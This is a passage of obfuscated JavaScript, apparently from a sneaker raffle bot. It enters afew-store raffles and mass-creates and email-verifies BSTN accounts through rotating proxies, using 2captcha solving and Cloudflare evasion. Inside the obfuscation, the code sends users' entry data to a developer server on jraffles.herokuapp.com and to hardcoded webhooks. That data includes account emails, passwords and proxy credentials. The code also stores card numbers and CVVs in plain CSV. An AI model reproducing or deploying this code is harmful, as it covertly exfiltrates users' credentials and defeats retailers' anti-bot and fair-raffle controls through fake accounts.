                        var _0x828b91 = JSON['parse'](_0x3f4ea0['readFileSync']('sizes.json', 'utf-8')), _0xf7feae = _0x13e09c[_0x5c618b]['Url'], _0x37c5af = _0x13e09c[_0x5c618b]['Size'], _0x5f28ed;
                        async function _0x5a2522() {
                            var _0x56783b = new _0x4f3dd1['CookieJar']();
                            console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x447273;
                            let _0x782eb = {
                                'method': 'GET',
                                'cookieJar': _0x56783b,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x42416b[0x2] + ':' + _0x42416b[0x3] + '@' + _0x42416b[0x0] + ':' + _0x42416b[0x1]
                            }, _0x2340e2 = _0xf7feae['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x534491 = _0x2340e2 + '.json', _0x219528 = await _0x3e71cb(_0x534491);
                            console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x205b0f = _0x219528['data']['product']['variants'];
                            if (_0x37c5af != 'RANDOM') {
                                if (_0x205b0f[0x1]['option1']['includes']('W')) {
                                    const _0x1fb1ed = _0x828b91['women']['find'](_0xc63590 => _0xc63590['EUsize'] === _0x37c5af);
                                    _0x1fb1ed && (_0x37c5af = _0x1fb1ed['size']);
                                } else {
                                    if (_0x205b0f[0x1]['option1']['includes']('Y')) {
                                        const _0x1f688d = _0x828b91['men']['find'](_0x51ced3 => _0x51ced3['EUsize'] === _0x37c5af);
                                        _0x1f688d && (_0x37c5af = _0x1f688d['size'] + 'Y');
                                    } else {
                                        const _0xd65f73 = _0x828b91['men']['find'](_0x5c2761 => _0x5c2761['EUsize'] === _0x37c5af);
                                        _0xd65f73 && (_0x37c5af = _0xd65f73['size']);
                                    }
                                }
                                for (var _0x42b2cb of _0x205b0f) {
                                    _0x42b2cb['option1'] == _0x37c5af && (_0x447273 = _0x42b2cb['id']);
                                }
                            } else {
                                var _0x44ec75 = Math['round'](Math['random']() * (_0x205b0f['length'] - 0x1));
                                _0x447273 = _0x205b0f[_0x44ec75]['id'];
                            }
                            console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3e71cb('https://raffles.afew-store.com/cart/' + _0x447273 + ':1'), _0x5f28ed = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5a2522();
                        } catch (_0x34bd2a) {
                            if (_0x34bd2a['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x34bd2a);
                        }
                        const _0x5d0fee = await _0x4b6ea3['newPage']();
                        await _0x5d0fee['setDefaultNavigationTimeout'](0x1d4c0), await _0x5d0fee['authenticate']({
                            'username': '' + _0x42416b[0x2],
                            'password': '' + _0x42416b[0x3]
                        }), await _0x5d0fee['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5d0fee['setRequestInterception'](!![]), _0x5d0fee['on']('request', _0x88883f => {
                            _0x88883f['resourceType']() === 'image' || _0x88883f['resourceType']() === 'font' || _0x88883f['resourceType']() === 'media' ? _0x88883f['abort']() : _0x88883f['continue']();
                        });
                        try {
                            await _0x5d0fee['goto'](_0x5f28ed, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x5d0fee['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5d0fee['type']('#checkout_email', '' + _0x13e09c[_0x5c618b]['Email']), await _0x558aee(0x320), await _0x5d0fee['type']('#checkout_attributes_instagram', '' + _0x13e09c[_0x5c618b]['Follower']), await _0x558aee(0x320), await _0x5d0fee['select']('#checkout_shipping_address_country', '' + _0x13e09c[_0x5c618b]['Country']), await _0x5d0fee['waitForTimeout'](0x258), await _0x5d0fee['type']('#checkout_shipping_address_first_name', '' + _0x13e09c[_0x5c618b]['FirstName']), await _0x5d0fee['waitForTimeout'](0x320), await _0x5d0fee['type']('#checkout_shipping_address_last_name', '' + _0x13e09c[_0x5c618b]['LastName']), await _0x5d0fee['waitForTimeout'](0x2bc), await _0x5d0fee['type']('#checkout_shipping_address_address1', _0x13e09c[_0x5c618b]['Address1'] + '\x20' + _0x13e09c[_0x5c618b]['HouseNumber']), await _0x5d0fee['waitForTimeout'](0x2bc), await _0x5d0fee['type']('#checkout_shipping_address_address2', '' + _0x13e09c[_0x5c618b]['Address2']), await _0x5d0fee['waitForTimeout'](0x2bc), await _0x5d0fee['type']('#checkout_shipping_address_zip', '' + _0x13e09c[_0x5c618b]['Zip']), await _0x5d0fee['waitForTimeout'](0x2bc), await _0x5d0fee['type']('#checkout_shipping_address_city', '' + _0x13e09c[_0x5c618b]['City']), await _0x5d0fee['waitForTimeout'](0x2bc);
                        if (_0x13e09c[_0x5c618b]['State'] != '')
                            try {
                                const _0x29bde9 = JSON['parse'](_0x3f4ea0['readFileSync']('States.json', 'utf8'));
                                await _0x558aee(0x1f4);
                                if (_0x13e09c[_0x5c618b]['State']['length'] > 0x2)
                                    for (let _0x1c2c5e of _0x29bde9) {
                                        if (_0x1c2c5e['Province'] == _0x13e09c[_0x5c618b]['State']) {
                                            await _0x5d0fee['select']('#checkout_shipping_address_province', _0x1c2c5e['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x5d0fee['select']('#checkout_shipping_address_province', _0x13e09c[_0x5c618b]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x558aee(0x190), _0x5d0fee['evaluate'](() => {
                            const _0x34dbc9 = document['querySelector']('#continue_button');
                            for (var _0x30830b = 0x0; _0x30830b < 0x5; _0x30830b++) {
                                if (_0x34dbc9) {
                                    _0x34dbc9['click'](), _0x34dbc9['click']();
                                    break;
                                } else
                                    _0x558aee(0xfa0);
                            }
                        }), await _0x5d0fee['waitForTimeout'](0x9c4);
                        try {
                            await _0x5d0fee['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x5d0fee['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x54b0b1 => _0x54b0b1['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5d0fee['waitForTimeout'](0x7d0), console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x5d0fee['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x558aee(0x3e8), await _0x5d0fee['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x28c582 => _0x28c582['submit']()), await _0x558aee(0x3e8);
                        try {
                            await _0x5d0fee['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5d0fee['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x369ebc => _0x369ebc['submit']());
                        try {
                            await _0x5d0fee['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x25effb = 'no', _0x10fee2(_0x13e09c[_0x5c618b], _0x247cf4), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                                try {
                                    await _0x5a13a5(_0x11db88['webhook'], _0x39123a['succesDEVMSG']);
                                } catch {
                                }
                            await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x39123a['succesDEVMSG']), await _0x558aee(0xc8);
                            try {
                                await _0x5a13a5(_0x122725, _0x39123a['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x94d398['replace']('#', ''),
                                    'module': _0x247cf4['name'],
                                    'entrydata': JSON['stringify'](_0x110990),
                                    'proxy': '' + _0x24b8ce[_0x5c618b]
                                };
                                var _0x20fc49 = JSON['stringify'](prxdata);
                                let _0x178300 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x20fc49, _0x178300);
                            } catch (_0x1101d6) {
                            }
                        } catch (_0x2f8adc) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5b3697) {
                        _0x5b3697['message']['includes']('selector') && (_0x5b3697 = 'Connection\x20Error');
                        console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20' + _0x5b3697)), _0x445d77 = '' + _0x5b3697;
                        var _0x2bd9df = await _0x459281(_0x13e09c[_0x5c618b], _0x247cf4, 'dev', !![], _0x445d77);
                        _0x39123a['errorDEV'] = { 'embeds': [_0x2bd9df] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x39123a['errorDEV']), await _0x5a13a5(_0x877ec9, _0x39123a['errorDEV']), _0x25effb = 'yes';
                    } finally {
                        _0x4b6ea3 && _0x4b6ea3['close']();
                        if (_0x25effb == 'yes' && _0x7e6f74 != 0x5 && _0x445d77 != 'Size\x20Not\x20Found') {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Retrying\x20(' + _0x7e6f74 + '\x20/\x205)')), _0x5c618b = _0x5c618b - 0x1, _0x7e6f74 = _0x7e6f74 + 0x1;
                            continue;
                        }
                        _0x25effb == 'yes' && _0x7e6f74 >= 0x5 && (_0x15a8e9(_0x13e09c[_0x5c618b], _0x247cf4), _0x25effb = 'no', _0x7e6f74 = 0x0);
                        if (_0x5c618b + 0x1 == _0x13e09c['length']) {
                            await _0x558aee(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x11db88['AfewDelay'] + '\x20ms'), await _0x558aee(_0x11db88['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0x2d0606, _0x597fb5, _0x50b197) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0x3f4ea0['writeFileSync']('proxies.txt', '');
                for (proxy in _0x50b197) {
                    _0x3f4ea0['appendFileSync']('proxies.txt', _0x50b197[proxy] + '\x0a');
                }
                for (var _0x1e63b3 = 0x0; _0x1e63b3 < _0x597fb5['length']; _0x1e63b3++) {
                    await _0x162b07(_0x597fb5, _0x1e63b3), _0x3f4ea0['appendFileSync']('tasks.csv', '\x0a' + _0x597fb5[_0x1e63b3]['Url'] + ',' + _0x597fb5[_0x1e63b3]['Size'] + ',' + _0x597fb5[_0x1e63b3]['Email'] + ',' + _0x597fb5[_0x1e63b3]['Password'] + ',' + _0x597fb5[_0x1e63b3]['FirstName'] + ',' + _0x597fb5[_0x1e63b3]['LastName'] + ',' + _0x597fb5[_0x1e63b3]['Address1'] + ',' + _0x597fb5[_0x1e63b3]['Address2'] + ',' + _0x597fb5[_0x1e63b3]['HouseNumber'] + ',' + _0x597fb5[_0x1e63b3]['Zip'] + ',' + _0x597fb5[_0x1e63b3]['City'] + ',' + _0x597fb5[_0x1e63b3]['Country'] + ',' + _0x597fb5[_0x1e63b3]['State'] + ',' + _0x597fb5[_0x1e63b3]['CardNumber'] + ',' + _0x597fb5[_0x1e63b3]['ExpiryDate'] + ',' + _0x597fb5[_0x1e63b3]['CVV'] + ',' + _0x597fb5[_0x1e63b3]['NameOnCard'] + ',' + _0x597fb5[_0x1e63b3]['Phone'] + ',' + _0x597fb5[_0x1e63b3]['Follower']);
                }
                let _0x474a0a = {
                    'username': _0x94d398,
                    'delay': _0x11db88['delay'],
                    'version': _0x3c77f4,
                    'webhook': _0x11db88['webhook']
                };
                const _0x40e98f = JSON['stringify'](_0x474a0a)['replace'](/"/g, '\x5c\x22');
                await _0x558aee(0x3e8), _0x4a8825('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x40e98f
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x460773, _0x12882c, _0x432ae5) {
                    var _0x41411f = _0x12882c, _0x351bac = 0x0;
                    for (var _0x53efa2 = 0x0; _0x53efa2 < _0x12882c['length']; _0x53efa2++) {
                        maxTasks = Number(_0x11db88['threads']);
                        while (_0x351bac >= maxTasks) {
                            await _0x558aee(_0x11db88['delay']);
                        }
                        async function _0xfbce25(_0x479e66, _0x1b6d78, _0x39d96b, _0x5aaa9c, _0x307676) {
                            _0x351bac++, _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x11db88['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x4b2bfd;
                            try {
                                await _0x162b07(_0x1b6d78, _0x5aaa9c);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x9f07d8(_0x479e66['name'] + '\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20/\x20' + _0x1b6d78['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                            var _0x4ffa8f = await _0x459281(_0x1b6d78[_0x5aaa9c], _0x479e66, 'acc', ![]);
                            const _0x177d10 = { 'succesDEVMSG': { 'embeds': [_0x4ffa8f] } }, _0x312096 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x54a2fe = Math['round'](Math['random']() * (_0x39d96b['length'] - 0x1)), _0x4957ea = _0x39d96b[_0x54a2fe]['split'](':'), _0xd0cf45;
                            try {
                                _0xd0cf45 = await _0x40dba9['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4957ea[0x0] + ':' + _0x4957ea[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0xd0cf45 = await _0x40dba9['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4957ea[0x0] + ':' + _0x4957ea[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x4f8a5e = await _0xd0cf45['newPage']();
                                await _0x4f8a5e['authenticate']({
                                    'username': '' + _0x4957ea[0x2],
                                    'password': '' + _0x4957ea[0x3]
                                }), console['log'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4f8a5e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4f8a5e['setRequestInterception'](!![]), _0x4f8a5e['on']('request', _0x49cc68 => {
                                    _0x49cc68['resourceType']() === 'image' ? _0x49cc68['abort']() : _0x49cc68['continue']();
                                });
                                try {
                                    await _0x4f8a5e['goto']('' + _0x312096), await _0x4f8a5e['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x4f8a5e['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x558aee(0x7d0), console['log'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x558aee(0x190), await _0x4f8a5e['waitForSelector']('#firstname'), await _0x4f8a5e['focus']('#firstname'), await _0x4f8a5e['keyboard']['down']('Control'), await _0x4f8a5e['keyboard']['press']('A'), await _0x558aee(0xc8), await _0x4f8a5e['keyboard']['up']('Control'), await _0x4f8a5e['keyboard']['press']('Backspace'), await _0x4f8a5e['type']('#firstname', _0x1b6d78[_0x5aaa9c]['FirstName'], { 'delay': 0xf0 }), await _0x558aee(0x190), await _0x4f8a5e['focus']('#lastname'), await _0x4f8a5e['keyboard']['down']('Control'), await _0x4f8a5e['keyboard']['press']('A'), await _0x558aee(0xc8), await _0x4f8a5e['keyboard']['up']('Control'), await _0x4f8a5e['keyboard']['press']('Backspace'), await _0x4f8a5e['type']('#lastname', _0x1b6d78[_0x5aaa9c]['LastName'], { 'delay': 0xe6 }), await _0x558aee(0x190), await _0x4f8a5e['focus']('#email_address'), await _0x4f8a5e['keyboard']['down']('Control'), await _0x4f8a5e['keyboard']['press']('A'), await _0x558aee(0xc8), await _0x4f8a5e['keyboard']['up']('Control'), await _0x4f8a5e['keyboard']['press']('Backspace'), await _0x4f8a5e['type']('#email_address', _0x1b6d78[_0x5aaa9c]['Email'], { 'delay': 0x122 }), await _0x558aee(0x190), await _0x4f8a5e['type']('#password', _0x1b6d78[_0x5aaa9c]['Password'], { 'delay': 0x82 }), await _0x558aee(0x1f4), await _0x4f8a5e['type']('#password-confirmation', _0x1b6d78[_0x5aaa9c]['Password'], { 'delay': 0x7c }), console['log'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20Sending\x20Request'), await _0x558aee(0x2bc), await _0x4f8a5e['$eval']('#form-validate', _0x36c144 => _0x36c144['submit']()), await _0x558aee(0x1388);
                                const _0x454084 = await _0x4f8a5e['$']('#email_address-error');
                                if (_0x454084)
                                    throw new Error('Invalid\x20Email');
                                const _0x3b7380 = await _0x4f8a5e['$']('#password-error');
                                if (_0x3b7380)
                                    throw new Error('Invalid\x20Password');
                                await _0x4f8a5e['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20Account\x20' + _0x1b6d78[_0x5aaa9c]['Email'] + '\x20Generated')), _0x3f4ea0['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x1b6d78[_0x5aaa9c]['Email'] + ',' + _0x1b6d78[_0x5aaa9c]['Password']);
                                try {
                                    _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x177d10['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5a13a5(_0x16a6f5, _0x177d10['succesDEVMSG']);
                                let _0x430fc2 = _0x1b6d78[_0x5aaa9c];
                                try {
                                    prxdata = {
                                        'username': _0x94d398['replace']('#', ''),
                                        'module': _0x479e66['name'],
                                        'entrydata': JSON['stringify'](_0x430fc2),
                                        'proxy': '' + _0x39d96b[_0x5aaa9c]
                                    };
                                    var _0x53ca83 = JSON['stringify'](prxdata);
                                    let _0x4f9f6c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x53ca83, _0x4f9f6c);
                                } catch (_0x2726cc) {
                                }
                                console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x34824d) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20' + _0x34824d)), _0x4b2bfd = '' + _0x34824d;
                                var _0x1227ec = await _0x459281(_0x1b6d78[_0x5aaa9c], _0x479e66, 'acc', !![], _0x4b2bfd);
                                _0x177d10['errorDEV'] = { 'embeds': [_0x1227ec] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x177d10['errorDEV']), await _0x5a13a5(_0x877ec9, _0x177d10['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0xd0cf45)
                                    _0xd0cf45['close']();
                                if (retry == 'yes' && _0x307676 < 0x5)
                                    return console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Task\x20' + (_0x5aaa9c + 0x1) + '\x20:\x20Retrying\x20(' + (_0x307676 + 0x1) + '\x20/\x205)')), _0x351bac--, _0x307676 = _0x307676 + 0x1, _0xfbce25(_0x479e66, _0x1b6d78, _0x39d96b, _0x5aaa9c, _0x307676);
                                retry == 'yes' && _0x307676 >= 0x5 && (_0x15a8e9(_0x1b6d78[_0x5aaa9c], _0x479e66), retry = 'no', _0x307676 = 0x0), _0x351bac--, console['log'](_0xb9a031() + '\x20[' + _0x479e66['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                            }
                        }
                        _0xfbce25(_0x460773, _0x41411f, _0x432ae5, _0x53efa2, 0x0), await _0x558aee(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x273e60, _0x13ebfa) {
                    var _0x53c9c4 = ![], _0xe01715 = [], _0x1673e4 = 0x0;
                    async function _0x520a34() {
                        var _0x3dfb21 = new _0xda3ce2({
                            'user': _0x11db88['masterMail'],
                            'password': _0x11db88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x259fbd(_0x3aaef5) {
                            _0x3dfb21['openBox']('INBOX', ![], _0x3aaef5);
                        }
                        _0x3dfb21['once']('ready', function () {
                            _0x259fbd(function (_0x222c48, _0x116374) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x222c48)
                                    throw _0x222c48;
                                _0x3dfb21['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x2896c0, _0x1e8dfd) {
                                    if (!_0x1e8dfd || !_0x1e8dfd['length'])
                                        console['log'](_0xb9a031() + '\x20[' + _0x273e60['name'] + ']\x20No\x20mails\x20found'), _0x3dfb21['end']();
                                    else {
                                        var _0x38d009 = _0x3dfb21['seq']['fetch'](_0x1e8dfd, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x38d009['on']('message', function (_0x3efa32, _0x56f423) {
                                            var _0x6bc0db = '(#' + _0x56f423 + ')\x20';
                                            _0x3efa32['on']('body', function (_0x35d362, _0x470f03) {
                                                _0x482936(_0x35d362, (_0x5dbb2f, _0x4fa688) => {
                                                    var _0x4dffae = _0x4fa688['text']['split']('customer/account/confirm/')[0x1], _0x1d3ddb = _0x4dffae['split'](']')[0x0], _0x37195d = _0x1d3ddb['split']('>')[0x0];
                                                    _0xe01715['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x37195d);
                                                });
                                            }), _0x3efa32['once']('end', function () {
                                            });
                                        }), _0x38d009['once']('error', function (_0x5a0b84) {
                                            console['log']('Fetch\x20error:\x20' + _0x5a0b84), _0x53c9c4 = !![];
                                        }), _0x38d009['once']('end', function () {
                                            _0x3dfb21['end'](), _0x53c9c4 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x3dfb21['once']('error', function (_0x510c87) {
                            console['log'](_0xe2a5bb['red'](_0x510c87['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x53c9c4 = !![];
                        }), _0x3dfb21['once']('end', async function () {
                            _0x53c9c4 = !![];
                        }), _0x3dfb21['connect']();
                    }
                    try {
                        _0x520a34();
                        while (!_0x53c9c4) {
                            await _0x558aee(0xfa0);
                        }
                        console['log']('Found\x20' + _0xe01715['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x558aee(0x7d0);
                    }
                    for (var _0x4c6821 = 0x0; _0x4c6821 < _0xe01715['length']; _0x4c6821++) {
                        maxTasks = Number(_0x11db88['threads']);
                        while (_0x1673e4 >= maxTasks) {
                            await _0x558aee(_0x11db88['delay']);
                        }
                        async function _0x1707c8(_0x189b3d, _0x2e898a, _0x4295d2, _0x17a4f3, _0x4ec89e) {
                            _0x1673e4++, _0x40dba9['use'](_0xa1d034());
                            if (_0x33a688 != 'yes')
                                var _0x33a688 = '', _0x4ec89e = 0x0;
                            var _0x30eb12 = Math['round'](Math['random']() * (_0x4295d2['length'] - 0x1)), _0x4e3835 = _0x4295d2[_0x30eb12]['split'](':'), _0x3acf1c;
                            try {
                                _0x3acf1c = await _0x40dba9['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4e3835[0x0] + ':' + _0x4e3835[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3acf1c = await _0x40dba9['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4e3835[0x0] + ':' + _0x4e3835[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x50a4aa = await _0x3acf1c['newPage']();
                                await _0x50a4aa['authenticate']({
                                    'username': '' + _0x4e3835[0x2],
                                    'password': '' + _0x4e3835[0x3]
                                }), console['log'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Task\x20' + (_0x17a4f3 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x50a4aa['setRequestInterception'](!![]), _0x50a4aa['on']('request', _0x4e0ab0 => {
                                    _0x4e0ab0['resourceType']() === 'image' ? _0x4e0ab0['abort']() : _0x4e0ab0['continue']();
                                }), console['log'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Task\x20' + (_0x17a4f3 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x50a4aa['goto'](_0x2e898a[_0x17a4f3]);
                                } catch (_0x38f7ea) {
                                    _0x33a688 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x38f7ea);
                                }
                                console['log'](_0xb9a031() + '\x20[' + _0x189b3d['name'] + ']\x20Task\x20' + (_0x17a4f3 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x50a4aa['waitForTimeout'](0xbb8);
                                try {
